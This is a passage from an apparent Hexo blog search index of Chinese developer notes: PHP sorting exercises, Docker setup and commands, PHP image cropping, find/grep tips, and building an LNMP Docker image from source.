class="symbol">$</span>l += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="symbol">$</span>result[<span class="symbol">$</span>i] = <span class="symbol">$</span><span class="built-in">min</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">echo <span class="string">'Asc Result:&lt;br/&gt;'</span>;</span><br><span class="line">print_r(<span class="symbol">$</span>result);</span><br><span class="line">echo <span class="string">'length:'</span>.<span class="symbol">$</span>l.<span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="meta-keyword">$l</span> = 0;</span></span><br><span class="line"># desc</span><br><span class="line"><span class="meta"><span class="meta-keyword">$result2</span> = [];</span></span><br><span class="line"><span class="keyword">for</span>(<span class="symbol">$</span>i=<span class="number">0</span>;<span class="symbol">$</span>i&lt;count(<span class="symbol">$</span>arr2);<span class="symbol">$</span>i++)&#123;</span><br><span class="line"><span class="symbol">$</span><span class="built-in">max</span> = <span class="symbol">$</span>arr2[<span class="symbol">$</span>i];</span><br><span class="line"><span class="keyword">for</span>(<span class="symbol">$</span>j=<span class="symbol">$</span>i;<span class="symbol">$</span>j&lt;count(<span class="symbol">$</span>arr2)<span class="number">-1</span>;<span class="symbol">$</span>j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="symbol">$</span><span class="built-in">max</span>&lt;<span class="symbol">$</span>arr2[<span class="symbol">$</span>j+<span class="number">1</span>])&#123;</span><br><span class="line"><span class="symbol">$</span>tmp = <span class="symbol">$</span>arr2[<span class="symbol">$</span>j+<span class="number">1</span>];</span><br><span class="line"><span class="symbol">$</span>arr2[<span class="symbol">$</span>j+<span class="number">1</span>] = <span class="symbol">$</span><span class="built-in">max</span>;</span><br><span class="line"><span class="symbol">$</span><span class="built-in">max</span> = <span class="symbol">$</span>tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="symbol">$</span>l += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="symbol">$</span>result2[count(<span class="symbol">$</span>arr2)<span class="number">-1</span>-<span class="symbol">$</span>i] = <span class="symbol">$</span><span class="built-in">max</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">echo <span class="string">'Desc Result:&lt;br/&gt;'</span>;</span><br><span class="line">print_r(<span class="symbol">$</span>result2);</span><br><span class="line">echo <span class="string">'length:'</span>.<span class="symbol">$</span>l.<span class="string">'&lt;br/&gt;'</span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithms </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> Algorithms </tag>
            
            <tag> select </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Algorithms_bubble</title>
      <link href="/2016/11/16/Algorithms-bubble/"/>
      <url>/2016/11/16/Algorithms-bubble/</url>
      
        <content type="html"><![CDATA[<h5 id="算法练习：冒泡排序"><a href="#算法练习：冒泡排序" class="headerlink" title="算法练习：冒泡排序"></a>算法练习：冒泡排序</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 排序算法</span></span><br><span class="line"><span class="variable">$arr</span> = [];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=0;<span class="variable">$i</span>&lt;10;<span class="variable">$i</span>++)&#123;</span><br><span class="line"><span class="variable">$arr</span>[] = mt_rand(1,500);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'元数据'</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">print_r(<span class="variable">$arr</span>);</span><br><span class="line"><span class="variable">$result</span> =  <span class="variable">$arr</span>;</span><br><span class="line"><span class="variable">$result2</span> = <span class="variable">$arr</span>;</span><br><span class="line"><span class="comment"># 冒泡 desc</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=0;<span class="variable">$i</span>&lt;count(<span class="variable">$result</span>)-1;<span class="variable">$i</span>++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$j</span>=0;<span class="variable">$j</span>&lt;count(<span class="variable">$result</span>)-<span class="variable">$i</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="variable">$j</span>] &lt; <span class="variable">$result</span>[<span class="variable">$j</span>+1])&#123;</span><br><span class="line"><span class="variable">$tmp</span> = <span class="variable">$result</span>[<span class="variable">$j</span>+1];</span><br><span class="line"><span class="variable">$result</span>[<span class="variable">$j</span>+1] = <span class="variable">$result</span>[<span class="variable">$j</span>];</span><br><span class="line"><span class="variable">$result</span>[<span class="variable">$j</span>] = <span class="variable">$tmp</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'Desc result'</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">print_r(<span class="variable">$result</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">var_dump(<span class="variable">$result</span> == sort(<span class="variable">$arr</span>));</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;'</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'Asc result&lt;br/&gt;'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># asc</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=0;<span class="variable">$i</span>&lt;count(<span class="variable">$result2</span>)-1;<span class="variable">$i</span>++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$j</span>=count(<span class="variable">$result2</span>)-1;<span class="variable">$j</span>&gt;=0;<span class="variable">$j</span>--)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result2</span>[<span class="variable">$j</span>] &lt; <span class="variable">$result2</span>[<span class="variable">$j</span>-1])&#123;</span><br><span class="line"><span class="variable">$tmp</span> = <span class="variable">$result2</span>[<span class="variable">$j</span>-1];</span><br><span class="line"><span class="variable">$result2</span>[<span class="variable">$j</span>-1] = <span class="variable">$result2</span>[<span class="variable">$j</span>];</span><br><span class="line"><span class="variable">$result2</span>[<span class="variable">$j</span>] = <span class="variable">$tmp</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">print_r(<span class="variable">$result2</span>);</span><br><span class="line">var_dump(<span class="variable">$result2</span> == sort(<span class="variable">$arr</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最佳时间复杂度 O(n)</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithms </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> Algorithms </tag>
            
            <tag> bubble </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>修改docker源地址</title>
      <link href="/2016/11/10/devops/docker-registry/"/>
      <url>/2016/11/10/devops/docker-registry/</url>
      
        <content type="html"><![CDATA[<p>maxos 直接找到配置 在registry加入地址即可<br><a href="http://b72d1176.m.daocloud.io" target="_blank" rel="noopener">http://b72d1176.m.daocloud.io</a></p><p>其他系统 修改docker配置文件/etc/default/docker如</p><p>DOCKER_OPTS=”–registry-mirror=<a href="http://b72d1176.m.daocloud.io&quot;" target="_blank" rel="noopener">http://b72d1176.m.daocloud.io&quot;</a></p><p>b72d1176为个人帐号的生成</p><p>可以自己注册帐号后在加速器中找到自己的URL<br>感谢 <a href="https://www.daocloud.io" target="_blank" rel="noopener">daocloud</a></p>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>angularjs几种生成工具的尝试</title>
      <link href="/2016/11/05/js/angularjs-try/"/>
      <url>/2016/11/05/js/angularjs-try/</url>
      
        <content type="html"><![CDATA[<p>想法是弄个angularjs的常用结构出来 可以快速的各种项目开发<br>但是可怜对angular的了解有限 暂时找了几个开源的试试</p><h6 id="generator-angular"><a href="#generator-angular" class="headerlink" title="generator-angular"></a>generator-angular</h6><blockquote><p><a href="https://github.com/yeoman/generator-angular" target="_blank" rel="noopener">https://github.com/yeoman/generator-angular</a><br>安装过程中总出错 依赖有点多  最后竟然没成功</p></blockquote><h6 id="generator-angularjs"><a href="#generator-angularjs" class="headerlink" title="generator-angularjs"></a>generator-angularjs</h6><blockquote><p><a href="https://www.npmjs.com/package/generator-angularjs" target="_blank" rel="noopener">https://www.npmjs.com/package/generator-angularjs</a></p></blockquote><h6 id="generator-angular-nmi"><a href="#generator-angular-nmi" class="headerlink" title="generator-angular-nmi"></a>generator-angular-nmi</h6><blockquote><p><a href="https://www.npmjs.com/package/generator-angular-nmi" target="_blank" rel="noopener">https://www.npmjs.com/package/generator-angular-nmi</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> angularjs </tag>
            
            <tag> generator </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker常用命令操作</title>
      <link href="/2016/11/02/devops/docker-useful/"/>
      <url>/2016/11/02/devops/docker-useful/</url>
      
        <content type="html"><![CDATA[<h5 id="docker-常用命令"><a href="#docker-常用命令" class="headerlink" title="docker 常用命令"></a>docker 常用命令</h5><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 拉取镜像</span></span><br><span class="line">docker pull openresty/openresty</span><br><span class="line">docker images</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建容器</span></span><br><span class="line">docker run -it -m 100MB -h doc.nginx -d <span class="params">--name=</span><span class="string">"nginx"</span> openresty/openresty </span><br><span class="line"><span class="comment"># -c cpu优先级  －m 内存（M） －h 主机  --name 容器名字  镜像  ［/bin/bash 进入容器命令行］</span></span><br><span class="line"><span class="comment"># -p  端口映射 主机端口:容器端口  -v 主机目录:容器目录</span></span><br><span class="line"></span><br><span class="line">示例：</span><br><span class="line">docker run -itd <span class="params">--name=</span><span class="string">"cent"</span> -m 512M -p 8080<span class="function">:80</span> -p 9000<span class="function">:9000</span> -v <span class="string">/Users/moran/Documents/angular/</span>:<span class="string">/data/angular</span> centos</span><br><span class="line"></span><br><span class="line">＃ 常用操作</span><br><span class="line">docker inspect 容器名字 ＃ 查看容器的信息</span><br><span class="line">docker attach <span class="comment"># 连接(进入)到一个正在运行的容器</span></span><br><span class="line">docker creeate <span class="comment"># 创建但不运行</span></span><br><span class="line">docker run<span class="comment"># 创建并运行</span></span><br><span class="line">docker top <span class="comment"># 显示容器的进程信息</span></span><br><span class="line">docker cp <span class="comment"># 从容器里向外拷贝文件或目录</span></span><br><span class="line">docker logs <span class="comment"># 查看容器的日志 !! 可以看到其标准（错误）输出</span></span><br><span class="line">docker exec -it 容器名字 bash<span class="comment"># 在容器中创建一个新的bash会话</span></span><br><span class="line"></span><br><span class="line">docker ps -[l|a]</span><br><span class="line">docker start|stop|restart|pause|unpause 容器名字<span class="string">/ID</span></span><br><span class="line">docker rm 容器</span><br><span class="line">docker rmi 镜像</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker build <span class="comment"># 使用Dockerfile创建镜像</span></span><br><span class="line">docker <span class="keyword">history</span> <span class="comment"># 显示生成一个镜像的历史命令</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">示例： 在官方centos7镜像上 安装一个node环境（虽然node也有镜像 但更喜欢自己装）</span><br><span class="line">docker pull centos</span><br><span class="line">docker run -itd <span class="params">--name=</span><span class="string">"cent"</span> -m 512M -p 8080<span class="function">:80</span> -p 9000<span class="function">:9000</span> -v <span class="string">/Users/moran/Documents/angular/</span>:<span class="string">/data/angular</span> centos</span><br><span class="line">docker attach cent</span><br><span class="line"></span><br><span class="line"><span class="comment">#  基础工具</span></span><br><span class="line">yum install wget vim gcc-c++ make -y</span><br><span class="line">yum install gem -y </span><br><span class="line">gem sources <span class="params">--add</span> https:<span class="string">//gems.ruby-china.org/</span> <span class="params">--remove</span> https:<span class="string">//rubygems.org/</span></span><br><span class="line">gem install compass</span><br><span class="line"></span><br><span class="line"><span class="comment">#  install npm</span></span><br><span class="line"><span class="keyword">cd</span> <span class="string">/tmp</span></span><br><span class="line">wget https:<span class="string">//nodejs.org/dist/v6.9.1/node-v6.9.1.tar.gz</span></span><br><span class="line">tar zxvf node-v6.9.1.tar.gz </span><br><span class="line"><span class="keyword">cd</span> node-v6.9.1</span><br><span class="line"><span class="string">./configure</span> </span><br><span class="line">make</span><br><span class="line">make install </span><br><span class="line"></span><br><span class="line"><span class="comment"># tools</span></span><br><span class="line">npm install -g cnpm <span class="params">--registry=https</span>:<span class="string">//registry.npm.taobao.org</span></span><br><span class="line">cnpm install -g grunt-cli </span><br><span class="line">cnpm install -g yo</span><br><span class="line">cnpm install -g bower</span><br><span class="line">cnpm install -g generator-karma</span><br><span class="line">cnpm install -g generator-angular</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存容器</span></span><br><span class="line">docker commit 版本ID 远程仓库</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php截图裁剪 缩放图片</title>
      <link href="/2016/10/25/php/php_image_cut/"/>
      <url>/2016/10/25/php/php_image_cut/</url>
      
        <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">image_resize</span><span class="params">($from, $tw,$th)</span></span>&#123;</span><br><span class="line">        <span class="comment">// 按指定大小生成缩略图，而且不变形，缩略图函数</span></span><br><span class="line">        $temp = <span class="keyword">array</span>(<span class="number">1</span>=&gt;<span class="string">'gif'</span>, <span class="number">2</span>=&gt;<span class="string">'jpeg'</span>, <span class="number">3</span>=&gt;<span class="string">'png'</span>);</span><br><span class="line">        <span class="keyword">list</span>($fw, $fh, $tmp) = getimagesize($from);</span><br><span class="line">        <span class="keyword">if</span>(!$temp[$tmp])&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $tmp = $temp[$tmp];</span><br><span class="line">        $infunc = <span class="string">"imagecreatefrom$tmp"</span>;</span><br><span class="line">        $outfunc = <span class="string">"image$tmp"</span>;</span><br><span class="line">        $fimg = $infunc($from);</span><br><span class="line">        <span class="comment">// 使缩略后的图片不变形，并且限制在 缩略图宽高范围内</span></span><br><span class="line">        <span class="keyword">if</span>($fw/$tw &gt; $fh/$th)&#123;</span><br><span class="line">            $th = $tw*($fh/$fw);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $tw = $th*($fw/$fh);</span><br><span class="line">        &#125;</span><br><span class="line">        $timg = imagecreatetruecolor($tw, $th);</span><br><span class="line">        imagecopyresampled($timg, $fimg, <span class="number">0</span>,<span class="number">0</span>, <span class="number">0</span>,<span class="number">0</span>, $tw,$th, $fw,$fh);</span><br><span class="line">        $to = C(<span class="string">'UPLOAD_PATH'</span>).C(<span class="string">'UPLOAD_SAVE_DIR_RULE'</span>).<span class="string">'a_'</span>.time().<span class="string">'_'</span>.mt_rand(<span class="number">100</span>,<span class="number">999</span>).<span class="string">'.'</span>.end(explode(<span class="string">'.'</span>,$from));</span><br><span class="line">        $r = $outfunc($timg, $to);</span><br><span class="line">        <span class="keyword">if</span>($r)&#123;</span><br><span class="line">            unlink($from);</span><br><span class="line">            <span class="keyword">return</span> $to;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">cut_img</span><span class="params">($from,$zero=[<span class="number">0</span>,<span class="number">0</span>],$cutSize=[<span class="number">300</span>,<span class="number">300</span>])</span></span>&#123;</span><br><span class="line">        $temp = <span class="keyword">array</span>(<span class="number">1</span>=&gt;<span class="string">'gif'</span>, <span class="number">2</span>=&gt;<span class="string">'jpeg'</span>, <span class="number">3</span>=&gt;<span class="string">'png'</span>);</span><br><span class="line">        <span class="keyword">list</span>($fw, $fh, $tmp) = getimagesize($from);</span><br><span class="line">        <span class="keyword">if</span>(!$temp[$tmp])&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $tmp = $temp[$tmp];</span><br><span class="line">        $infunc = <span class="string">"imagecreatefrom$tmp"</span>;</span><br><span class="line">        $outfunc = <span class="string">"image$tmp"</span>;</span><br><span class="line">        $timg = $infunc($from);</span><br><span class="line">        $cutImg=imagecreatetruecolor($cutSize[<span class="number">0</span>], $cutSize[<span class="number">1</span>]);</span><br><span class="line">        <span class="comment"># 将 $timg 图像中坐标从 src_x，src_y  开始，宽度为 src_w，高度为 src_h 的一部分拷贝到 dst_im 图像中坐标为 dst_x 和 dst_y 的位置上。</span></span><br><span class="line">        imagecopy($cutImg,$timg,<span class="number">0</span>,<span class="number">0</span>,$zero[<span class="number">0</span>], $zero[<span class="number">1</span>],$cutSize[<span class="number">0</span>], $cutSize[<span class="number">1</span>]);</span><br><span class="line">        $to = C(<span class="string">'UPLOAD_PATH'</span>).C(<span class="string">'UPLOAD_SAVE_DIR_RULE'</span>).<span class="string">'a_'</span>.time().<span class="string">'_'</span>.mt_rand(<span class="number">100</span>,<span class="number">999</span>).<span class="string">'.'</span>.end(explode(<span class="string">'.'</span>,$from));</span><br><span class="line">        $r = $outfunc($cutImg, $to);</span><br><span class="line">        <span class="keyword">if</span>($r)&#123;</span><br><span class="line">            unlink($from);</span><br><span class="line">            <span class="keyword">return</span> str_replace(<span class="string">'../'</span>,<span class="string">'/'</span>,$to);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> image </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux-find-grep</title>
      <link href="/2016/10/25/linux/linux-find-grep/"/>
      <url>/2016/10/25/linux/linux-find-grep/</url>
      
        <content type="html"><![CDATA[<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">在当前目录下所有文件中查找内容包含 string 的文件:</span><br><span class="line"><span class="builtin-name">find</span> ./ -name <span class="string">"*"</span> -exec grep <span class="string">"string"</span> &#123;&#125; \; </span><br><span class="line">注意:在最后不能加 print,否则会出错</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">在当前目录下所有文件中查找内容包含 string 的文件并列出字符所在的文件:</span><br><span class="line"><span class="builtin-name">find</span> ./ -name <span class="string">"*"</span> -exec grep -l <span class="string">"string"</span> &#123;&#125; \; </span><br><span class="line"> </span><br><span class="line">在当前目录下 *.c 中查找内容包含 string 的文件并列出字符所在的文件的所在行(不显示文件名):</span><br><span class="line"><span class="builtin-name">find</span> ./ -name <span class="string">"*.c"</span> -exec grep -n <span class="string">"string"</span> &#123;&#125; \; </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">在当前目录下所有文件中查找内容包含 string 的文件并列出字符所在的文件,所在行及所在行的内容:</span><br><span class="line"><span class="builtin-name">find</span> ./ -name <span class="string">"*"</span> -exec grep -n <span class="string">"string"</span> ./ &#123;&#125; \; </span><br><span class="line"> </span><br><span class="line">使用 <span class="builtin-name">find</span> 查找时希望忽略某个目录(-prune)：</span><br><span class="line">如果希望在 /app 目录下查找文件， 但不希望在 /app/bin 目录下查找：</span><br><span class="line"><span class="builtin-name">find</span> /app -name <span class="string">"/app/bin"</span> -prune -o -<span class="builtin-name">print</span> </span><br><span class="line"></span><br><span class="line">使用type 选项:</span><br><span class="line">如果要在 /etc 目录下查找所有的目录：</span><br><span class="line"><span class="builtin-name">find</span> /etc -type d -print</span><br><span class="line"></span><br><span class="line">如果要在 /etc 目录下查找 .svn 的目录：</span><br><span class="line"><span class="builtin-name">find</span> /etc -name .svn -type d -<span class="builtin-name">print</span> </span><br><span class="line"></span><br><span class="line">为了在当前目录下查找除目录以外的所有类型的文件：</span><br><span class="line"><span class="builtin-name">find</span> . ! -type d -print</span><br><span class="line"> </span><br><span class="line">为了在当前目录下查找所有的符号链接文件， 可以用：</span><br><span class="line"><span class="builtin-name">find</span> . -type l -print</span><br><span class="line"><span class="builtin-name">find</span> .  -mtime -4（4天内）/4(4天前的那一天)/+4（5天前）</span><br><span class="line"><span class="builtin-name">find</span> .</span><br><span class="line">         -name  *</span><br><span class="line">         -size   +50k</span><br><span class="line">         -type    f/b/c/d/l/sp<span class="built_in">..</span>.</span><br><span class="line">         -perm    -/+ /    755</span><br><span class="line">         -uid<span class="built_in">/user </span>     201/yangsf</span><br><span class="line">         -gid<span class="built_in">/group </span>   501/yangsf</span><br><span class="line">         -nouser/nogroup   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">为了用 ls -l 命令列出所匹配到的文件， 可以把 ls -l 命令放在find命令的 -exec 选项中：</span><br><span class="line"><span class="builtin-name">find</span> . -type f -exec ls -l &#123;&#125; \;</span><br><span class="line">注： f 表示普通文件  exec 选项后面跟随着所要执行的命令， 然后是一对 &#123;&#125;， 一个空格和一个 \，最后是一个分号。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> find </tag>
            
            <tag> grep </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>useful-linux-cmd</title>
      <link href="/2016/10/19/linux/useful-linux-cmd/"/>
      <url>/2016/10/19/linux/useful-linux-cmd/</url>
      
        <content type="html"><![CDATA[<h6 id="寻找"><a href="#寻找" class="headerlink" title="寻找"></a>寻找</h6><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">find .  -mtime <span class="number">-4</span>（<span class="number">4</span>天内）/<span class="number">4</span>(<span class="number">4</span>天前的那一天)/+<span class="number">4</span>（<span class="number">5</span>天前）</span><br><span class="line">locate fielname* (updatedb)</span><br></pre></td></tr></table></figure><h6 id="寻找定位"><a href="#寻找定位" class="headerlink" title="寻找定位"></a>寻找定位</h6><figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> ./ -<span class="built_in">name</span> <span class="string">"*.c"</span> -<span class="built_in">exec</span> grep -n <span class="string">"string"</span> &#123;&#125; \;</span><br></pre></td></tr></table></figure><h6 id="寻找与替换"><a href="#寻找与替换" class="headerlink" title="寻找与替换"></a>寻找与替换</h6><figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> -<span class="built_in">name</span> <span class="string">"*"</span> -<span class="built_in">exec</span> sed -i <span class="string">'s/str1/str2/g'</span> &#123;&#125;\;-print</span><br></pre></td></tr></table></figure><h6 id="ssh请求"><a href="#ssh请求" class="headerlink" title="ssh请求"></a>ssh请求</h6><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ssh</span> -nNTf  -D <span class="number">7000</span> root<span class="variable">@IP</span></span><br><span class="line">ssh -qTfnN -D <span class="number">7070</span> root<span class="variable">@IP</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> find </tag>
            
            <tag> grep </tag>
            
            <tag> ssh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自建docker lnmp镜像</title>
      <link href="/2016/06/05/devops/%E8%87%AA%E5%BB%BAdocker%20lnmp%E9%95%9C%E5%83%8F/"/>
      <url>/2016/06/05/devops/%E8%87%AA%E5%BB%BAdocker%20lnmp%E9%95%9C%E5%83%8F/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull centos ＃ 拉取镜像到本地</span><br><span class="line">docker run  -i -t -p 8000:80  --name=centosDev centos  </span><br><span class="line">cat /etc/redhat-release #查看系统版本</span><br><span class="line">&gt;CentOS Linux release 7.2.1511 (Core)</span><br><span class="line"></span><br><span class="line">＃ 开发环境安装  采取源码安装</span><br><span class="line">yum install kernel-devel  vim gcc cmake  -y</span><br><span class="line">mkdir /data/src -p</span><br><span class="line">cd /data/src/</span><br><span class="line">yum install wget -y</span><br><span class="line"></span><br><span class="line"># nginx   安装路径/usr/local/openresty/nginx/  运行用户www</span><br><span class="line">wget http://openresty.org/download/ngx_openresty-1.5.12.1.tar.gz</span><br><span class="line">tar zxvf  ngx_openresty-1.5.12.1.tar.gz</span><br><span class="line">cd ngx_openresty-1.5.12.1</span><br><span class="line">yum install readline-devel pcre-devel openssl-devel -y</span><br><span class="line">yum install gcc gcc-c++ make -y</span><br><span class="line">./configure --with-luajit -j2</span><br><span class="line">make -j2</span><br><span class="line">make install</span><br><span class="line">groupadd www</span><br><span class="line">useradd www -g www -M -s /sbin/nologin</span><br><span class="line">cd /usr/local/openresty/nginx/conf/</span><br><span class="line">mv nginx.conf nginx.conf.bak</span><br><span class="line">vi /usr/local/openresty/nginx/conf/nginx.conf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user  www;</span><br><span class="line">worker_processes  1;</span><br><span class="line"></span><br><span class="line">#error_log  logs/error.log;</span><br><span class="line">#error_log  logs/error.log  notice;</span><br><span class="line">#error_log  logs/error.log  info;</span><br><span class="line"></span><br><span class="line">pid        logs/nginx.pid;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    use epoll;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line">    charset utf-8;</span><br><span class="line">    #log_format  main  &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;</span><br><span class="line">    #                  &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;</span><br><span class="line">    #                  &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;</span><br><span class="line"></span><br><span class="line">    #access_log  logs/access.log  main;</span><br><span class="line">    access_log off;</span><br><span class="line">    server_names_hash_bucket_size 128;</span><br><span class="line">    client_header_buffer_size 128k;</span><br><span class="line">    large_client_header_buffers 4 128k;</span><br><span class="line">    client_max_body_size 300m;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    sendfile        on;</span><br><span class="line">    server_tokens off;</span><br><span class="line">    #tcp_nopush     on;</span><br><span class="line"></span><br><span class="line">    #keepalive_timeout  0;</span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line"></span><br><span class="line">    tcp_nodelay on;</span><br><span class="line"></span><br><span class="line">    fastcgi_connect_timeout 300;</span><br><span class="line">    fastcgi_send_timeout 300;</span><br><span class="line">    fastcgi_read_timeout 300;</span><br><span class="line">    fastcgi_buffer_size 64k;</span><br><span class="line">    fastcgi_buffers 4 64k;</span><br><span class="line">    fastcgi_busy_buffers_size 128k;</span><br><span class="line">    fastcgi_temp_file_write_size 128k;</span><br><span class="line"></span><br><span class="line">    #add_header Vary Accept-Encoding;</span><br><span class="line">    include vhosts/*.conf;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cd /usr/local/openresty/nginx/conf/</span><br><span class="line">mkdir vhosts</span><br><span class="line">vim vhosts/default.conf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">        listen   80;</span><br><span class="line"></span><br><span class="line">        root /data/www;</span><br><span class="line">        index index.html index.htm;</span><br><span class="line"></span><br><span class="line">        server_name localhost;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">                try_files $uri $uri/ /index.html;</span><br><span class="line">                # include /etc/nginx/naxsi.rules</span><br><span class="line">        &#125;</span><br><span class="line">        location ~ .*\.php?$</span><br><span class="line">        &#123;</span><br><span class="line">            include fastcgi_params;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vim fastcgi_params</span><br><span class="line"></span><br><span class="line">if ($request_filename ~* (.*)\.php) &#123;</span><br><span class="line">    set $php_url $1;</span><br><span class="line">&#125;</span><br><span class="line">if (!-e $php_url.php) &#123;</span><br><span class="line">    return 403;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fastcgi_ignore_client_abort  on;</span><br><span class="line">fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">fastcgi_index  index.php;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># mysql</span><br><span class="line">cd /data/src/</span><br><span class="line">wget http://120.52.72.20/cdn.mysql.com/c3pr90ntc0td//Downloads/MySQL-5.7/mysql-5.7.13.tar.gz</span><br><span class="line">tar zxvf mysql-5.7.13.tar.gz</span><br><span class="line">cd mysql-5.7.13</span><br><span class="line">cmake  